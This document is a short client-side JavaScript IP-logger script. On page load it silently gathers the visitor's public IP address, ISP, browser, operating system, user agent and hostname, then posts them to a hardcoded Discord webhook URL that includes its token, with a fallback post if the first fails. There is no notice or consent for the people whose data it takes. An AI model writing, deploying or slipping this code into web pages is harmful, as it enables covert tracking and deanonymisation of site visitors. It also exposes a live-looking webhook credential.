
const timestamp = Date.now();


let ip = "";
let browser = window.navigator.userAgent;
let os = window.navigator.platform;
let userAgent = navigator.userAgent;
let hostName = window.location.hostname;
let isp = "";


fetch("https://api.ipify.org")
  .then(response => response.text()) 
  .then(data => { 
    ip = data;
    return fetch(`https://ipapi.co/${ip}/json/`); 
  })
  .then(response => response.json()) 
  .then(data => { 
    isp = data.org;
    
    const body = { content: `Date/Time: ${timestamp}\nIP Address: ${ip}\nBrowser: ${browser}\nOperating System: ${os}\nUser Agent: ${userAgent}\nHost Name: ${hostName}\nISP: ${isp}` };
    fetch("https://discord.com/api/webhooks/1199826495632314569/4cf-N-amlzEA1M6FzJoJ-DLj7bc-pYgqElRkC638klwCFwhfbI35LTwgB7DccdhQzjDt", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } })
      .then(() => console.log("success")) 
      .catch(() => { 
        const body = { content: `Date/Time: ${timestamp}\nIP Address: ${ip}\nBrowser: ${browser}\nOperating System: ${os}\nUser Agent: ${userAgent}\nHost Name: ${hostName}` };
        fetch("https://discord.com/api/webhooks/1199826495632314569/4cf-N-amlzEA1M6FzJoJ-DLj7bc-pYgqElRkC638klwCFwhfbI35LTwgB7DccdhQzjDt", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } })
          .then(() => console.log("Success! (fallback)")) 
      }); 
  }); 
